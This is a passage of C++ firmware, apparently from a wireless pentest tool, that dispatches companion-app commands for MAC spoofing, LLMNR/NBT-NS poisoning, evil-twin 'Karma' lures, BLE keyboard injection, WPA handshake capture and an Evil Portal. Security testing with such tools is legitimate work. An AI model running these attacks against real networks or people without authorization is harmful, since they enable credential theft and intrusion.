                        //   wifi_set_mac <mac|random> -> set + persist the STA MAC
                        if (cmdStr.startsWith("wifi_get_mac")) {
                            companionAckMsg(id, true, WiFi.macAddress().c_str());
                            break;
                        }
                        if (cmdStr.startsWith("wifi_set_mac ")) {
                            String arg = cmdStr.substring(13);
                            arg.trim();
                            String mac = arg.equalsIgnoreCase("random") ? generateRandomMAC() : arg;
                            if (!validateMACFormat(mac)) {
                                sendErr(id, 400, "usage: wifi_set_mac <aa:bb:cc:dd:ee:ff|random>");
                                break;
                            }
                            uint8_t m[6];
                            sscanf(
                                mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &m[0], &m[1], &m[2], &m[3],
                                &m[4], &m[5]
                            );
                            // esp_wifi_set_mac needs the Wi-Fi driver started and the STA idle.
                            WiFi.mode(WIFI_STA);
                            WiFi.disconnect(false);
                            esp_err_t r = esp_wifi_set_mac(WIFI_IF_STA, m);
                            if (r == ESP_OK) {
                                bruceConfig.wifiMAC = mac;
                                bruceConfig.saveFile();
                                companionAckMsg(id, true, mac.c_str());
                            } else {
                                companionAckMsg(id, false, esp_err_to_name(r));
                            }
                            break;
                        }
                        // Brucegotchi (Pwnagotchi parity): headless, time-bounded WPA-handshake
                        // collector. brucegotchi <secs> -> ACK handshakes=<n>. AUTHORIZED USE ONLY.
                        // Responder (LLMNR/NBT-NS poisoning). responder <secs>. Needs Wi-Fi joined. AUTHORIZED USE.
                        if (cmdStr.startsWith("responder")) {
#if !defined(LITE_VERSION)
                            int rsecs = cmdStr.length() > 10 ? cmdStr.substring(10).toInt() : 0;
                            if (rsecs < 5) rsecs = 60;
                            if (rsecs > 600) rsecs = 600;
                            uint32_t pois = 0;
                            String last;
                            bool ok = responder_run((uint32_t)rsecs * 1000, pois, last, companionPollStop);
                            if (!ok) {
                                companionAckMsg(id, false, "join Wi-Fi first (wifi_connect)");
                            } else {
                                char out[80];
                                snprintf(out, sizeof(out), "poisoned=%lu last=%s", (unsigned long)pois, last.c_str());
                                companionAckMsg(id, true, out);
                            }
#else
                            sendErr(id, 501, "responder not available in this (lite) build");
#endif
                            break;
                        }
                        // Karma (evil-twin probe-response lure). karma <secs> -> run headless. AUTHORIZED USE.
                        if (cmdStr.startsWith("karma")) {
#if !defined(LITE_VERSION)
                            int ksecs = cmdStr.length() > 6 ? cmdStr.substring(6).toInt() : 0;
                            if (ksecs < 5) ksecs = 60;
                            if (ksecs > 600) ksecs = 600;
                            // Long + draws its own UI, like brucegotchi: poll serial for an app stop,
                            // then redraw the locked companion screen it painted over.
                            karma_run_headless((uint32_t)ksecs * 1000, companionPollStop);
                            companionAckMsg(id, true, "karma done");
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
#else
                            sendErr(id, 501, "karma not available in this (lite) build");
#endif
                            break;
                        }
                        // BLE HID presenter / keyboard (parity with Bruce "BLE Keyboard"/"Presenter").
                        //   ble_hid_begin           -> advertise as a BLE keyboard (pair from the target)
                        //   ble_hid_status          -> connected | advertising | off
                        //   ble_hid_key <name>      -> press a presenter key (next/prev/pageup/.../esc)
                        //   ble_hid_type <text>     -> type text
                        //   ble_hid_end             -> stop advertising / disconnect
                        if (cmdStr.startsWith("ble_hid_")) {
#if !defined(LITE_VERSION)
                            if (cmdStr == "ble_hid_begin") {
                                if (!g_companionHid) {
                                    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("Brucia");
                                    g_companionHid = new BleKeyboard("Brucia", "BruceFW", 100);
                                    g_companionHid->begin();
                                }
                                companionAckMsg(id, true, "advertising - pair 'Brucia' from the target");
                            } else if (cmdStr == "ble_hid_status") {
                                const char *st = !g_companionHid ? "off" : (g_companionHid->isConnected() ? "connected" : "advertising");
                                companionAckMsg(id, true, st);
                            } else if (cmdStr == "ble_hid_end") {
                                if (g_companionHid) {
                                    g_companionHid->end();
                                    delete g_companionHid;
                                    g_companionHid = nullptr;
                                }
                                companionAckMsg(id, true, "stopped");
                            } else if (cmdStr.startsWith("ble_hid_key ")) {
                                if (!g_companionHid || !g_companionHid->isConnected()) {
                                    companionAckMsg(id, false, "not connected - ble_hid_begin + pair first");
                                } else {
                                    uint8_t k = companionHidKey(cmdStr.substring(12));
                                    if (k == 0) { sendErr(id, 400, "unknown key"); break; }
                                    g_companionHid->press(k);
                                    delay(20);
                                    g_companionHid->releaseAll();
                                    companionAckMsg(id, true, "key");
                                }
                            } else if (cmdStr.startsWith("ble_hid_type ")) {
                                if (!g_companionHid || !g_companionHid->isConnected()) {
                                    companionAckMsg(id, false, "not connected - ble_hid_begin + pair first");
                                } else {
                                    g_companionHid->print(cmdStr.substring(13).c_str());
                                    companionAckMsg(id, true, "typed");
                                }
                            } else {
                                sendErr(id, 400, "unknown ble_hid_ command");
                            }
#else
                            sendErr(id, 501, "ble_hid not available in this (lite) build");
#endif
                            break;
                        }
                        // Stop arriving when nothing is running (the running case is consumed by the
                        // abort poll inside brucegotchi_run_headless): just ack. Checked before the
                        // startsWith below so it isn't misread as a new run.
                        if (cmdStr == "brucegotchi_stop") {
                            companionAckMsg(id, true, "not running");
                            break;
                        }
                        if (cmdStr.startsWith("brucegotchi")) {
#if !defined(LITE_VERSION)
                            int gsecs = cmdStr.length() > 12 ? cmdStr.substring(12).toInt() : 0;
                            if (gsecs < 5) gsecs = 30;
                            if (gsecs > 600) gsecs = 600;
                            uint16_t hs = 0;
                            // While it runs the companion loop is blocked, so poll the serial here for
                            // an app-sent stop (device ESC also stops it).
                            brucegotchi_run_headless((uint32_t)gsecs * 1000, hs, companionPollStop);
                            char out[48];
                            snprintf(out, sizeof(out), "handshakes=%u", (unsigned)hs);
                            companionAckMsg(id, true, out);
                            // The run took over the screen; redraw the locked companion screen so the
                            // app-lock is visible again and the device doesn't look "unlocked".
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
#else
                            sendErr(id, 501, "brucegotchi not available in this (lite) build");
#endif
                            break;
                        }
                        if (cmdStr.startsWith("jam_detect")) {
#if !defined(LITE_VERSION)
                            int secs = cmdStr.length() > 11 ? cmdStr.substring(11).toInt() : 0;
                            if (secs < 1) secs = 5;
                            if (secs > 120) secs = 120;
                            uint32_t deauth = 0, total = 0;
                            jam_detect_run(secs, deauth, total, companionPollStop);
                            char out[64];
                            snprintf(
                                out, sizeof(out), "deauth=%lu total=%lu",
                                (unsigned long)deauth, (unsigned long)total
                            );
                            companionAckMsg(id, true, out);
#else
                            sendErr(id, 501, "jam_detect not available in this (lite) build");
#endif
                            break;
                        }
                        String out;
                        bool ok = routeCommand(cmdStr, out);
                        JsonDocument o;
                        beginEnvelope(o, MSG_ACK, id);
                        JsonObject d = o["d"].to<JsonObject>();
                        d["ok"] = ok;
                        d["out"] = out;
                        sendEnvelope(o);
                        break;
                    }
                    case MSG_SUB: {
                        const char *stream = in["d"]["stream"] | "";
                        bool on = in["d"]["on"] | false;
                        if (strcmp(stream, "ble.scan") == 0) {
                            if (on) bleStart(); else bleStop();
                            subBleOn = on;
                            sendAck(id, true);
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
                        } else if (strcmp(stream, "subghz.raw") == 0) {
                            if (on) {
#if defined(COMPANION_HAS_CC1101)
                                subghzSpecStop(); // raw + spectrum both own the CC1101
#endif
                                subghzStart();
                            } else {
                                subghzStop();
                            }
                            subGhzOn = on;
                            sendAck(id, true);
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
                        } else if (strcmp(stream, "subghz.spectrum") == 0) {
#if defined(COMPANION_HAS_CC1101)
                            if (on) {
                                subghzStop(); // spectrum + raw both own the CC1101 -> exclusive
                                // Optional sweep window (MHz); defaults to the ~300-348 MHz band.
                                float fs = in["d"]["f_start"] | 300.0;
                                float fe = in["d"]["f_end"] | 348.0;
                                float st = in["d"]["step"] | 1.0;
                                subghzSpecStart(fs, fe, st);
                            } else {
                                subghzSpecStop();
                            }
                            subGhzOn = on;
                            sendAck(id, true);
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
#else
                            sendErr(id, 501, "no CC1101 on this board");
#endif
                        } else if (strcmp(stream, "wifi.ap") == 0) {
                            subWifiAp = on;
                            if (on) {
                                staStop();   // wifi.ap scan, the sta sniffer, the probe
                                probeStop(); // sniffer and the monitor capture all share the
                                monStop();   // Wi-Fi radio -> mutually exclusive
                            }
                            WiFi.scanDelete();
                            scanning = false;
                            if (on) {
                                WiFi.mode(WIFI_STA);
                                WiFi.disconnect(false, true);
                            }
                            sendAck(id, true);
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
                        } else if (strcmp(stream, "wifi.sta") == 0) {
                            if (on) {
                                subWifiAp = false; // mutually exclusive with the AP scan
                                probeStop();       // and with the probe sniffer (shared radio)
                                monStop();         // and with the monitor capture
                                WiFi.scanDelete();
                                scanning = false;
                                staStart();
                            } else {
                                staStop();
                            }
                            sendAck(id, true);
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
                        } else if (strcmp(stream, "wifi.probe") == 0) {
                            if (on) {
                                subWifiAp = false; // mutually exclusive with wifi.ap and wifi.sta
                                staStop();
                                monStop(); // and with the monitor capture (shared radio)
                                WiFi.scanDelete();
                                scanning = false;
                                probeStart();
                            } else {
                                probeStop();
                            }
                            sendAck(id, true);
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
                        } else if (strcmp(stream, "wifi.monitor") == 0) {
                            // Full 802.11 monitor-mode capture. Optional channel lock + BSSID filter.
                            if (on) {
                                subWifiAp = false; // shares the Wi-Fi radio with ap/sta/probe
                                staStop();
                                probeStop();
                                WiFi.scanDelete();
                                scanning = false;
                                int channel = in["d"]["channel"] | 0; // 0 = slow-hop the band
                                const char *bssid = in["d"]["bssid"] | "";
                                monStart(channel, bssid);
                            } else {
                                monStop();
                            }
                            sendAck(id, true);
                            drawCompanionScreen(helloSeen, subWifiAp, subBleOn, subGhzOn);
                        } else if (strcmp(stream, "mic.spectrum") == 0) {
#ifdef COMPANION_HAS_MIC
                            if (on) micStart(); else micStop();
                            sendAck(id, true);
#else
                            sendErr(id, 501, "no microphone on this board");
#endif
                        } else if (strcmp(stream, "mic.pcm") == 0) {
#ifdef COMPANION_HAS_MIC
                            if (on) micPcmStart(); else micPcmStop();
                            sendAck(id, true);
#else
                            sendErr(id, 501, "no microphone on this board");
#endif
                        } else {
                            sendErr(id, 404, "unknown stream");
                        }
                        break;
                    }
                    default: sendErr(id, 404, "unknown message kind"); break;
                }
            }
        }

        // 2) Service the wifi.ap stream: run back-to-back async scans and emit
        //    each access point as an EVENT. The radio is free because the
        //    transport is USB, not WiFi.
        if (subWifiAp) {
            if (!scanning) {
                WiFi.scanNetworks(/*async=*/true, /*show_hidden=*/true);
                scanning = true;
            } else {
                int n = WiFi.scanComplete();
                if (n >= 0) {
                    for (int i = 0; i < n; i++) {
                        sendWifiApEvent(
                            WiFi.BSSIDstr(i), WiFi.SSID(i), WiFi.channel(i), WiFi.RSSI(i),
                            encToStr(WiFi.encryptionType(i))
                        );
                    }
                    WiFi.scanDelete();
                    scanning = false; // a fresh scan starts next iteration
                }
                // n == WIFI_SCAN_RUNNING: keep waiting
            }
        }

        // 3) Service the sub-ghz raw stream.
        subghzService();

        // 3b) Service the sub-ghz spectrum sweep stream (CC1101).
#if defined(COMPANION_HAS_CC1101)
        subghzSpecService();
#endif

        // 4) Service the BLE scan stream.
        bleService();

        // 5) Service the wifi.sta station sniffer stream.
        staService();

        // 5b) Service the wifi.probe (probe-request) sniffer stream.
        probeService();

        // 5c) Service the wifi.monitor full 802.11 capture stream.
        monService();

        // 5d) Service the Evil Portal (captive-portal AP) if one is running.
#if !defined(LITE_VERSION)
        evilPortalService();
#endif

        // 6) Service the mic.spectrum stream (onboard microphone).
#ifdef COMPANION_HAS_MIC
        micService();
        // 6b) Service the raw mic.pcm stream (gapless continuous capture for phone DSP).
        micPcmService();
#endif

        // 7) Service the FM audio I2S sink (phone PCM or onboard mic -> Si4713).
#ifdef COMPANION_HAS_FM_AUDIO
        fmAudioService();
#endif
    }

    WiFi.scanDelete();
    subghzStop();
#if defined(COMPANION_HAS_CC1101)
    subghzSpecStop();
#endif
    bleStop();
    staStop();
    probeStop();
    monStop();
#if !defined(LITE_VERSION)
    evilPortalStop(0, false); // tear down the Evil Portal AP if a session was left running
#endif
#ifdef COMPANION_HAS_MIC
    micStop();
    micPcmStop(); // release the continuous mic capture if a mic.pcm sub was left running
#endif
#if defined(HAS_NS4168_SPKR)
    if (spkrPcmActive) {
        audio_pcm_end(); // close the streamed-PCM speaker if it was left open
        spkrPcmActive = false;
    }
#endif
#ifdef COMPANION_HAS_FM_AUDIO
    fmAudioStopInternal(); // stop the FM audio I2S sink if it was running
#endif
#ifdef COMPANION_HAS_FM
    fm_stop(); // make sure the FM carrier is off when we leave companion mode
#endif
#ifdef COMPANION_HAS_LORA
    lora_companion_end(); // release the LoRa radio if a session left it running
#endif
#if !defined(LITE_VERSION)
    if (g_companionHid) { // a BLE HID session left advertising: tear it down so it doesn't linger
        g_companionHid->end();
        delete g_companionHid;
        g_companionHid = nullptr;
    }
#endif
    companionRestoreOutputs(); // leaving companion mode: screen/LED back on
    g_companionActive = false; // Serial is a normal console again
    if (serialcmdsTaskHandle) vTaskResume(serialcmdsTaskHandle);
}
